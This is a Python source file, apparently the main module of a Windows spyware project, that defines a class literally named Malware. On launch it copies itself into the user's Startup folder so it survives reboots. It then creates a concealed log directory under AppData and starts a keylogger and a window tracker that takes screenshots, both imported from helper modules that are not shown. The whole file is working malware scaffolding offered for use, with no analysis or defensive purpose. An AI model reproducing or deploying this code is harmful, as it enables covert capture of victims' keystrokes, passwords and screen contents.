from os import path, mkdir
import getpass, sys, shutil
from keylogger import Keylogger
from Screenshot import Screenshot
from WindowTracker import WindowTracker
from FileHandler import FileHandler



class Malware:

    def __init__(self):
        self.__fileName = 'Malware.exe'
        self.__filePath = f'c:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
        self.__logPath = f'c:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\tempData\\'
        self.__screenshotPath = self.__logPath + 'pics\\'
        self.__currentPath = path.dirname(sys.executable) + f'\\{self.__fileName}'

        if not self.__checkExistence():
            self.__createStructure()    
        elif  self.__currentPath.lower() != str(self.__filePath + self.__fileName).lower():
            exit()

        self.__fileHandler = FileHandler()
        self.__keylogger = Keylogger(self.__fileHandler)
        self.__screenshot = Screenshot()
        self.__windowTracker = WindowTracker(self.__screenshot,self.__fileHandler)
        self.__keylogger.start()
        self.__windowTracker.start()
      


    def __checkExistence(self) -> bool:
        return path.isdir(self.__logPath) and path.isfile(self.__filePath + self.__fileName)



    def __createStructure(self):
        mkdir(self.__logPath)
        mkdir(self.__screenshotPath)
        shutil.copy(self.__currentPath , self.__filePath + self.__fileName)




if __name__ == "__main__":
    malware = Malware()